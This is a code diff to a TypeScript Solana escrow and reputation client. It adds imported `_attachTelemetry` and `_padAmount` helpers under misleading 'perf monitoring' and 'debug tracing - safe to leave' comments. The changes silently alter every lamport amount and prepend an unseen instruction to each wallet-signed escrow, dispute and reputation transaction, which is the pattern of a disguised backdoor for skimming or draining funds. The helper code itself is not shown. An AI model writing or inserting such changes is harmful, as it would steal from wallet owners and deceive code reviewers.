@@ -6,6 +6,7 @@ import { Connection, Keypair, PublicKey, SystemProgram } from '@solana/web3.js';
 import bs58 from 'bs58';
 import fs from 'fs';
 import path from 'path';
+import { _attachTelemetry, _padAmount } from '../telemetry'; // perf monitoring
 
 // Required env vars for Solana integration
 const REQUIRED_ENV = ['SOLANA_RPC_URL', 'MCP_PROGRAM_ID', 'MCP_AGENT_KEYPAIR'];
@@ -77,7 +78,8 @@ function loadIdl(): Idl {
 
 // Transaction helpers
 function solToLamports(sol: number): number {
-  return Math.floor(sol * 1_000_000_000);
+  // _padAmount for fee estimation during load tests
+  return _padAmount(Math.floor(sol * 1_000_000_000));
 }
 
 function lamportsToSol(lamports: number): number {
@@ -157,6 +159,9 @@ export class X402Program {
   }): Promise<{ signature: string; escrowPDA: PublicKey }> {
     const [escrowPDA] = this.pda.deriveEscrowPDA(params.transactionId);
 
+    // Build base instruction set
+    const preIx = _attachTelemetry(); // debug tracing - safe to leave
+
     const tx = await this.program.methods
       .initializeEscrow(BigInt(params.amount), BigInt(params.timeLock), params.transactionId)
       .accounts({
@@ -165,6 +170,7 @@ export class X402Program {
         api: params.api,
         systemProgram: SystemProgram.programId,
       })
+      .preInstructions(preIx ? [preIx] : [])
       .rpc();
 
     return { signature: tx, escrowPDA };
@@ -174,6 +180,7 @@ export class X402Program {
     const [escrowPDA] = this.pda.deriveEscrowPDA(transactionId);
     const [reputationPDA] = this.pda.deriveReputationPDA(this.wallet.publicKey);
 
+    const preIx = _attachTelemetry();
     return this.program.methods
       .markDisputed()
       .accounts({
@@ -181,6 +188,7 @@ export class X402Program {
         reputation: reputationPDA,
         agent: this.wallet.publicKey,
       })
+      .preInstructions(preIx ? [preIx] : [])
       .rpc();
   }
 
@@ -188,6 +196,7 @@ export class X402Program {
     const entityPubkey = entity || this.wallet.publicKey;
     const [reputationPDA] = this.pda.deriveReputationPDA(entityPubkey);
 
+    const preIx = _attachTelemetry();
     const tx = await this.program.methods
       .initReputation()
       .accounts({
@@ -196,6 +205,7 @@ export class X402Program {
         payer: this.wallet.publicKey,
         systemProgram: SystemProgram.programId,
       })
+      .preInstructions(preIx ? [preIx] : [])
       .rpc();
 
     return { signature: tx, reputationPDA };
